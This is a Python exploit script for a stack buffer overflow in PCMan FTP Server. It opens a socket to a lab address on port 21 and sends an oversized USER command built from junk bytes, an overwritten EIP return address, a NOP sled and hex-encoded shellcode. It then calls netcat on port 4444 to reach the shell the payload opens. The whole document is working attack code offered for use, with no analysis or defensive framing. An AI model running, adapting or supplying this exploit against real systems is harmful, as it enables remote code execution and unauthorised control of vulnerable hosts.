#Importing Libraries
import socket, os
from struct import pack

#Creating Junk data
evil = 'A' * 20000

#Declaring a TCP Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Connecting to the PCMan FTP Server using Windows machine IP and port 21
s.connect(('192.168.56.102',21))

#Recieve FTP Banner
a = s.recv(1024)

#Created shellcode
shellcode = ("\xd9\xcb\xd9\x74\x24\xf4\x58\xbd\xf0\xa0\xa6\xe1\x2b\xc9" +
"\xb1\x53\x31\x68\x17\x03\x68\x17\x83\x18\x5c\x44\x14\x24" +
"\x75\x0b\xd7\xd4\x86\x6c\x51\x31\xb7\xac\x05\x32\xe8\x1c" +
"\x4d\x16\x05\xd6\x03\x82\x9e\x9a\x8b\xa5\x17\x10\xea\x88" +
"\xa8\x09\xce\x8b\x2a\x50\x03\x6b\x12\x9b\x56\x6a\x53\xc6" +
"\x9b\x3e\x0c\x8c\x0e\xae\x39\xd8\x92\x45\x71\xcc\x92\xba" +
"\xc2\xef\xb3\x6d\x58\xb6\x13\x8c\x8d\xc2\x1d\x96\xd2\xef" +
"\xd4\x2d\x20\x9b\xe6\xe7\x78\x64\x44\xc6\xb4\x97\x94\x0f" +
"\x72\x48\xe3\x79\x80\xf5\xf4\xbe\xfa\x21\x70\x24\x5c\xa1" +
"\x22\x80\x5c\x66\xb4\x43\x52\xc3\xb2\x0b\x77\xd2\x17\x20" +
"\x83\x5f\x96\xe6\x05\x1b\xbd\x22\x4d\xff\xdc\x73\x2b\xae" +
"\xe1\x63\x94\x0f\x44\xe8\x39\x5b\xf5\xb3\x55\xa8\x34\x4b" +
"\xa6\xa6\x4f\x38\x94\x69\xe4\xd6\x94\xe2\x22\x21\xda\xd8" +
"\x93\xbd\x25\xe3\xe3\x94\xe1\xb7\xb3\x8e\xc0\xb7\x5f\x4e" +
"\xec\x6d\xf5\x46\x4b\xde\xe8\xab\x2b\x8e\xac\x03\xc4\xc4" +
"\x22\x7c\xf4\xe6\xe8\x15\x9d\x1a\x13\x08\x02\x92\xf5\x40" +
"\xaa\xf2\xae\xfc\x08\x21\x67\x9b\x73\x03\xdf\x0b\x3b\x45" +
"\xd8\x34\xbc\x43\x4e\xa2\x37\x80\x4a\xd3\x47\x8d\xfa\x84" +
"\xd0\x5b\x6b\xe7\x41\x5b\xa6\x9f\xe2\xce\x2d\x5f\x6c\xf3" +
"\xf9\x08\x39\xc5\xf3\xdc\xd7\x7c\xaa\xc2\x25\x18\x95\x46" +
"\xf2\xd9\x18\x47\x77\x65\x3f\x57\x41\x66\x7b\x03\x1d\x31" +
"\xd5\xfd\xdb\xeb\x97\x57\xb2\x40\x7e\x3f\x43\xab\x41\x39" +
"\x4c\xe6\x37\xa5\xfd\x5f\x0e\xda\x32\x08\x86\xa3\x2e\xa8" +
"\x69\x7e\xeb\xc8\x8b\xaa\x06\x61\x12\x3f\xab\xec\xa5\xea" +
"\xe8\x08\x26\x1e\x91\xee\x36\x6b\x94\xab\xf0\x80\xe4\xa4" +
"\x94\xa6\x5b\xc4\xbc"
)
#EIP junk data
junk = 'A' * 2003
nops = "\x90" * 30

eip = pack('<L', 0x7C9D30D7)

#EIP Writing pattern 
evil = junk + eip + nops + shellcode

print(' [+] ' + a)

#Sending junk data to the server
s.send('USER' + evil + '\r\n')

#Holding for 5 seconds
os.system("sleep 5")
#Getting the shell
os.system("nc -v 192.168.56.102 4444")